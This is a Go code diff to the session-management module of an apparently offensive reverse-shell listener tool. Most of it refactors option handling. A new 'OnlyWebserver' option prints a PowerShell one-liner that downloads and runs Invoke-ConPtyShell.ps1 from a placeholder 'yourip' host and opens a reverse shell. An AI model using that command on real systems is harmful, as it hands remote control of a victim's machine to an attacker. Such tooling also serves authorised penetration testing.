@@ -2,6 +2,7 @@ package sessions
 
 import (
 	"fmt"
+	"nc-shell/src/terminal"
 	"os"
 	"sort"
 	"strconv"
@@ -9,15 +10,8 @@ import (
 	logging "github.com/op/go-logging"
 )
 
-// Options type to manage the terminal's options
-type Options struct {
-	Port          int
-	Debug         bool
-	DisableConPTY bool
-}
-
 // OptionsSession contains the option of the futur terminal and the listener
-var OptionsSession Options
+var OptionsSession terminal.Options
 
 // PrintSessions will list all active sessions
 func PrintSessions() {
@@ -59,7 +53,12 @@ func Start() {
 
 // Stop the listener
 func Stop() {
-	term.Listener.Close()
+	if term.Listener != nil {
+		if err := term.Listener.Close(); err != nil {
+			term.Log.Error("Unable to close the listener " + err.Error())
+		}
+	}
+	term.Listener = nil
 }
 
 // Restart the listener
@@ -72,6 +71,7 @@ func Restart() {
 func SetDebug(debugString string) {
 	if debug, err := strconv.ParseBool(debugString); err == nil {
 		OptionsSession.Debug = debug
+		PrintDebugOptions()
 		Logger()
 	} else {
 		log.Error("Debug option " + debugString + " invalid")
@@ -82,6 +82,7 @@ func SetDebug(debugString string) {
 func SetPort(portString string) {
 	if port, err := strconv.Atoi(portString); err == nil {
 		OptionsSession.Port = port
+		PrintPortOptions()
 	} else {
 		log.Error("Port option " + portString + " invalid")
 	}
@@ -91,8 +92,24 @@ func SetPort(portString string) {
 func SetDisableConPTY(disableConPTYString string) {
 	if disableConPTY, err := strconv.ParseBool(disableConPTYString); err == nil {
 		OptionsSession.DisableConPTY = disableConPTY
+		PrintDisableConPTYOptions()
 	} else {
 		log.Error("DisableConPTY option " + disableConPTYString + " invalid")
+	}
+}
+
+// SetOnlyWebserver update the option OnlyWebserver
+func SetOnlyWebserver(onlyWebserverString string) {
+	if onlyWebserver, err := strconv.ParseBool(onlyWebserverString); err == nil {
+		OptionsSession.OnlyWebserver = onlyWebserver
+		PrintOnlyWebserverOptions()
+		// If OnlyWebServer is enable we print the oneliner
+		if onlyWebserver {
+			log.Info("connect with: powershell IEX(IWR http://yourip:" + strconv.Itoa(OptionsSession.Port) + "/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell yourIP " + strconv.Itoa(OptionsSession.Port))
+		}
+		Restart()
+	} else {
+		log.Error("OnlyWebserver option " + onlyWebserverString + " invalid")
 	}
 }
 
@@ -108,8 +125,12 @@ func PrintPortOptions() {
 
 // PrintDisableConPTYOptions print the value of DisableConPTY options
 func PrintDisableConPTYOptions() {
-
 	fmt.Println("DisableConPTY => " + strconv.FormatBool(OptionsSession.DisableConPTY))
+}
+
+// PrintDisableConPTYOptions print the value of DisableConPTY options
+func PrintOnlyWebserverOptions() {
+	fmt.Println("OnlyWebserver => " + strconv.FormatBool(OptionsSession.OnlyWebserver))
 }
 
 // PrintOptions print the current options for the terminal
@@ -117,6 +138,7 @@ func PrintOptions() {
 	PrintDebugOptions()
 	PrintPortOptions()
 	PrintDisableConPTYOptions()
+	PrintOnlyWebserverOptions()
 }
 
 // Logger configure the logger of the application
